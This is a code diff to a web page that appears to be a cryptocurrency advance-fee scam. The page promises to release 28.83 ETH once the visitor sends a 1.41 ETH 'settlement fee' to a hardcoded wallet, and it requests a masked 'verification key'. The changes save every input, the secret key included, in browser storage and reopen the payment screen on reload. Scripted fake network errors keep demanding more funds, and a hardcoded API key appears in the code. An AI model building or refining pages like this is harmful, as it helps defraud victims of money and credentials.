@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -116,15 +116,15 @@
 
         <div class="input-wrapper">
             <label>Protocol Allocation ID</label>
-            <input type="text" placeholder="e.g. ETH-MAIN-9928-X" id="allocId">
+            <input type="text" placeholder="e.g. ETH-MAIN-9928-X" id="allocId" oninput="saveInputs()">
         </div>
         <div class="input-wrapper">
             <label>Beneficiary Settlement Address (ERC-20/ETH)</label>
-            <input type="text" placeholder="0x..." id="wallet">
+            <input type="text" placeholder="0x..." id="wallet" oninput="saveInputs()">
         </div>
         <div class="input-wrapper">
             <label>Network Verification Key</label>
-            <input type="password" placeholder="••••••••" id="accessKey">
+            <input type="password" placeholder="••••••••" id="accessKey" oninput="saveInputs()">
         </div>
         <button class="deploy-btn" onclick="startDeployment()">INITIALIZE NETWORK CONTRACT</button>
         <div class="security-footer">
@@ -173,12 +173,34 @@
     <script>
         const TARGET_WALLET = "0x1D86d51Fe26f693E61b6461c3c2B6ED5bFEf3d2b";
         const REQUIRED_FEE = 1.41;
-        const ETHERSCAN_API_KEY = "ATUAJBD9PE7HUBAZY7QHQ4YTZ6VFAGWJMU"; // REPLACE WITH YOUR API KEY
+        const ETHERSCAN_API_KEY = "ATUAJBD9PE7HUBAZY7QHQ4YTZ6VFAGWJMU"; 
+
+        // --- LOCAL STORAGE LOGIC ---
+        function saveInputs() {
+            localStorage.setItem('allocId', document.getElementById('allocId').value);
+            localStorage.setItem('wallet', document.getElementById('wallet').value);
+            localStorage.setItem('accessKey', document.getElementById('accessKey').value);
+        }
+
+        window.onload = function() {
+            if(localStorage.getItem('allocId')) document.getElementById('allocId').value = localStorage.getItem('allocId');
+            if(localStorage.getItem('wallet')) document.getElementById('wallet').value = localStorage.getItem('wallet');
+            if(localStorage.getItem('accessKey')) document.getElementById('accessKey').value = localStorage.getItem('accessKey');
+
+            if(localStorage.getItem('currentPhase') === 'validator') {
+                const w = localStorage.getItem('wallet');
+                const a = localStorage.getItem('allocId');
+                showValidator(w, a, true);
+            }
+        };
+        // ---------------------------
 
         function startDeployment() {
             const wallet = document.getElementById('wallet').value;
             const alloc = document.getElementById('allocId').value;
             if(!wallet || !alloc) { alert("ERROR: PROTOCOL DATA REQUIRED"); return; }
+
+            localStorage.setItem('currentPhase', 'validator');
 
             document.getElementById('loader').style.display = 'flex';
             const stages = ["COMPILING EVM BYTECODE...", "GENERATING PROTOCOL HASH...", "BINDING BENEFICIARY ADDRESS...", "STAGING 28.83 ETH LIQUIDITY...", "BROADCASTING TO MAINNET..."];
@@ -194,7 +216,7 @@
             }, 1200);
         }
 
-        function showValidator(wallet, alloc) {
+        function showValidator(wallet, alloc, skipAnimation = false) {
             document.getElementById('loader').style.display = 'none';
             document.getElementById('phase-init').style.display = 'none';
             document.getElementById('phase-validator').style.display = 'block';
@@ -211,6 +233,16 @@
             ];
 
             const typewriter = document.getElementById('typewriter');
+
+            if(skipAnimation) {
+                typewriter.innerHTML = codeSnippet.join('<br>') + '<span class="cursor"></span>';
+                document.getElementById('status-text').innerText = "AWAITING SETTLEMENT";
+                document.getElementById('obligation-ui').style.opacity = "1";
+                document.getElementById('data-ui').style.opacity = "1";
+                document.getElementById('action-ui').style.opacity = "1";
+                return;
+            }
+
             let lineIndex = 0;
             function typeLine() {
                 if (lineIndex < codeSnippet.length) {
@@ -257,7 +289,6 @@
                         btn.innerText = "SETTLEMENT VERIFIED";
                         alert("SUCCESS: Settlement Fee detected. Your 28.83 ETH is now being released.");
                     } else {
-                        // Pass the ACTUAL balance found to the error message
                         displayError("FEE_NOT_DETECTED", balanceEth.toFixed(2));
                     }
                 } else {
@@ -278,7 +309,7 @@
                 title = "INSUFFICIENT SETTLEMENT FUNDS";
                 msg = "The Ethereum Network has detected that there are insufficient funds in the Escrow Funding Gateway.\n\n" +
                       `REQUIRED BALANCE: 1.41 ETH\n` +
-                      `CURRENT BALANCE: ${currentBal} ETH\n\n` + // Shows exactly what they sent
+                      `CURRENT BALANCE: ${currentBal} ETH\n\n` + 
                       `The 28.83 ETH release is restricted. A remaining balance of ${(1.41 - currentBal).toFixed(2)} ETH is required to complete the settlement protocol.`;
             } else {
                 title = "CONNECTION ERROR";
@@ -287,9 +318,6 @@
 
             alert(`[NETWORK ERROR: ${title}]\n\n${msg}`);
         }
-
-
-
     </script>
 </body>
 </html>
